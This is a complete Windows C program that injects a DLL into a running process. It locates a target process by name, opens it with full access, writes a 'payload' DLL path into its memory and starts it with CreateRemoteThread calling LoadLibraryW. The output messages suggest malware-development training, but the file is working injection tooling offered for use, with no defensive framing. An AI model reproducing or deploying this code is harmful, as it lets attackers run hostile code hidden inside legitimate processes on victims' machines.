#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <string.h>

BOOL InjectDllToRemoteProcess(HANDLE hProcess, LPWSTR DllName) {
    BOOL            bSTATE = TRUE;

    LPVOID          pLoadLibraryW = NULL;
    LPVOID          pAddress = NULL;

    DWORD           dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);

    SIZE_T          lpNumberOfBytesWritten = NULL;

    HANDLE          hThread = NULL;

    pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (pLoadLibraryW == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }
    pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite);
    printf("[#] Press <Enter> To Write ... ");
    getchar();

    if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
        printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytesWritten);
    printf("[#] Press <Enter> To Run ... ");
    getchar();

    printf("[i] Executing Payload ... ");
    hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pLoadLibraryW, pAddress, NULL, NULL);
    if (hThread == NULL) {
        printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }
    printf("[+] DONE !\n");


_EndOfFunction:
    if (hThread)
        CloseHandle(hThread);
    return bSTATE;
}

BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
    PROCESSENTRY32 pe;
    HANDLE                  hSnapShot = NULL;
    PROCESSENTRY32  Proc = {
                      pe.dwSize = sizeof(PROCESSENTRY32)
    };

    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    if (!Process32First(hSnapShot, &Proc)) {
        printf("[!] Process32First Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    do {

        WCHAR LowerName[MAX_PATH * 2];

        if (Proc.szExeFile) {

            DWORD   dwSize = lstrlenW(Proc.szExeFile);
            DWORD   i = 0;

            RtlSecureZeroMemory(LowerName, MAX_PATH * 2);
            if (dwSize < MAX_PATH * 2) {

                for (; i < dwSize; i++)
                    LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

                LowerName[i++] = '\0';
            }
        }

        if (wcscmp(LowerName, szProcessName) == 0) {

            *dwProcessId = Proc.th32ProcessID;
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
            if (*hProcess == NULL)
                printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

            break;
        }

    } while (Process32Next(hSnapShot, &Proc));

_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    if (*dwProcessId == NULL || *hProcess == NULL)
        return FALSE;
    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {

    HANDLE  hProcess = NULL;
    DWORD   dwProcessId = NULL;

    if (argc < 3) {
        wprintf(L"[!] Usage : \"%s\" <Complete Dll Payload Path> <Process Name> \n", argv[0]);
        return -1;
    }

    wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", argv[2]);
    if (!GetRemoteProcessHandle(argv[2], &dwProcessId, &hProcess)) {
        printf("[!] Process is Not Found \n");
        return -1;
    }
    wprintf(L"[+] DONE \n");
    printf("[i] Found Target Process Pid: %d \n", dwProcessId);

    if (!InjectDllToRemoteProcess(hProcess, argv[1])) {
        return -1;
    }

    CloseHandle(hProcess);
    printf("[#] Press <Enter> To Quit ... ");
    getchar();
    return 0;
}
